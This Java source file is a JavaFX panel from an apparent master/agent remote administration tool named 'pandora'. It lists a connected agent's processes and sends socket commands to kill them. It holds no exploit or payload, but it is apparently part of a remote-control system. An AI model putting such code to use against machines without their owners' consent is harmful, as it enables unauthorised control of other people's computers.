package org.pandora.master.scene.impl.agent;


import de.jensd.fx.glyphs.fontawesome.FontAwesomeIcon;
import de.jensd.fx.glyphs.fontawesome.FontAwesomeIconView;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.collections.transformation.FilteredList;
import javafx.geometry.Insets;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.TableColumn;
import javafx.scene.control.TableView;
import javafx.scene.layout.AnchorPane;
import javafx.scene.layout.Background;
import javafx.scene.layout.BackgroundFill;
import javafx.scene.layout.CornerRadii;
import javafx.scene.paint.Color;
import javafx.scene.shape.Line;
import org.controlsfx.control.textfield.CustomTextField;
import org.pandora.master.Master;
import org.pandora.master.builder.BuilderManager;
import org.pandora.master.builder.impl.scene.ControllerBuilder;
import org.pandora.master.data.agent.AgentData;
import org.pandora.master.data.process.ProcessData;
import org.pandora.master.utils.TimeUtils;

import java.util.ArrayList;
import java.util.stream.Collectors;

public class Process {

    private final AnchorPane anchorPane;
    private final BuilderManager builderManager;
    private final AgentData agentData;
    private final ArrayList<String> waiting;
    private final Master master;
    private final ControllerBuilder controllerBuilder;
    private final TableView<ProcessData> tableView;
    private final ObservableList<ProcessData> observableList;
    private final FilteredList<ProcessData> filteredList;
    private final TableColumn<ProcessData, String> idColumn;
    private final TableColumn<ProcessData, String> nameColumn;
    private final TableColumn<ProcessData, String> commandColumn;

    public Process(final ControllerBuilder controllerBuilder) {
        this.controllerBuilder = controllerBuilder;
        this.master = controllerBuilder.getMaster();
        this.anchorPane = controllerBuilder.getAnchorPane();
        this.builderManager = controllerBuilder.getBuilderManager();
        this.agentData = controllerBuilder.getAgentData();
        this.waiting = controllerBuilder.getWaiting();
        this.tableView = (TableView<ProcessData>) this.builderManager.getTableViewBuilder().buildTableView("No result found OR waiting for processes...", Color.WHITE, 16, 456, 969, 0, 54, "agent-processManager-tableView");
        this.observableList = FXCollections.observableArrayList();
        this.filteredList = new FilteredList(this.observableList);
        this.idColumn = (TableColumn<ProcessData, String>) this.builderManager.getTableColumnBuilder().buildTableColumn("PID", 85, "pid");
        this.nameColumn = (TableColumn<ProcessData, String>) this.builderManager.getTableColumnBuilder().buildTableColumn("Name", 245, "name");
        this.commandColumn = (TableColumn<ProcessData, String>) this.builderManager.getTableColumnBuilder().buildTableColumn("Command Line", 620, "command");
    }

    public void open() {
        this.master.getStageManager().getScenes().put(this.controllerBuilder, this);
        this.anchorPane.setBackground(new Background(new BackgroundFill(Color.rgb(26, 27, 36), CornerRadii.EMPTY, Insets.EMPTY)));

        final Label defaultLabel = this.builderManager.getLabelBuilder().buildLabel("Processes | " + this.agentData.getUser() + "@" + this.agentData.getAddress(), 15, 20, Color.rgb(230, 230, 230), "Consolas", 17);
        final Line line = this.builderManager.getBasicLineBuilder().buildSimpleLine(Color.WHITE, 20, 52, 949, 52);

        final FontAwesomeIconView fontAwesomeIconView = new FontAwesomeIconView(FontAwesomeIcon.SEARCH);
        fontAwesomeIconView.setFill(Color.rgb(118, 119, 135));
        fontAwesomeIconView.setSize("15");

        final CustomTextField searchField = new CustomTextField();
        searchField.setTranslateX(667);
        searchField.setTranslateY(14);
        searchField.setPrefWidth(250);
        searchField.setPrefHeight(25);
        searchField.setPromptText("Search...");
        searchField.setLeft(fontAwesomeIconView);
        searchField.textProperty().addListener((obs, oldValue, newValue) -> this.filteredList.setPredicate(processData -> {
            final String value = newValue.toLowerCase().trim();
            return processData.getCommand().toLowerCase().contains(value) || processData.getName().toLowerCase().contains(value) || processData.getPid().toLowerCase().contains(value);
        }));

        searchField.setId("searchField");
        fontAwesomeIconView.setId("searchFontAwesomeIcon");

        this.tableView.setItems(this.filteredList);
        this.tableView.getColumns().setAll(this.idColumn, this.nameColumn, this.commandColumn);
        this.tableView.requestLayout();

        final Button refreshButton = this.builderManager.getButtonBuilder().buildButton(null, "Refresh", 866, 536, Color.WHITE, "Verdana", 12, 75, 25, "agent-processManager-refresh");
        final Button closeButton = this.builderManager.getButtonBuilder().buildButton(null, "Kill It", 27, 536, Color.WHITE, "Verdana", 12, 75, 25, "agent-processManager-close");

        closeButton.setOnMouseClicked(event -> {
            if (this.tableView.getSelectionModel().getSelectedItem() != null)
                this.sendCloseRequest(this.tableView.getSelectionModel().getSelectedItem().getPid());
        });

        refreshButton.setOnMouseClicked(event -> this.sendListRequest());

        this.sendListRequest();

        this.anchorPane.getChildren().addAll(line, this.tableView, defaultLabel, refreshButton, closeButton, searchField);
    }

    private void sendListRequest() {
        final String id = TimeUtils.getRandomId();
        this.observableList.clear();
        this.master.getProcessManager().deleteAll(this.agentData.getId());
        this.waiting.add(id);
        this.master.getSocketUtils().write(this.agentData.getId(), "processManager:list:" + id);
    }

    private void sendCloseRequest(final String pid) {
        this.master.getSocketUtils().write(this.agentData.getId(), "processManager:close:" + pid);
        this.observableList.removeAll(this.observableList.stream().filter(processData -> processData.getPid().equals(pid)).collect(Collectors.toList()));
        this.master.getProcessManager().delete(this.agentData.getId(), pid);
        this.tableView.getSelectionModel().clearSelection();
    }

    public void receiveRequest(final String id, final String response) {
        if (this.waiting.contains(id)) {
            this.waiting.remove(id);
            this.observableList.clear();
            this.master.getProcessManager().deleteAll(this.agentData.getId());
            final String[] processSplit = response.split("#");
            for (int i = 0; i < this.count(response); i++) {
                final String[] valueSplit = processSplit[i].split(":");
                final ProcessData processData = new ProcessData(valueSplit[0].replace("(doubleDot)", ":").replace("(hashtag)", "#"), valueSplit[1].replace("(doubleDot)", ":").replace("(hashtag)", "#"), valueSplit[2].replace("(doubleDot)", ":").replace("(hashtag)", "#"));
                this.master.getAgentManager().getAgentData(this.agentData.getId()).getProcesses().add(processData);
                this.observableList.add(processData);
            }
            this.tableView.setItems(this.filteredList);
        }
    }

    private int count(final String string) {
        int count = 0;
        for (int i = 0; i < string.length(); i++) if (string.charAt(i) == '#') count++;
        return count;
    }
}


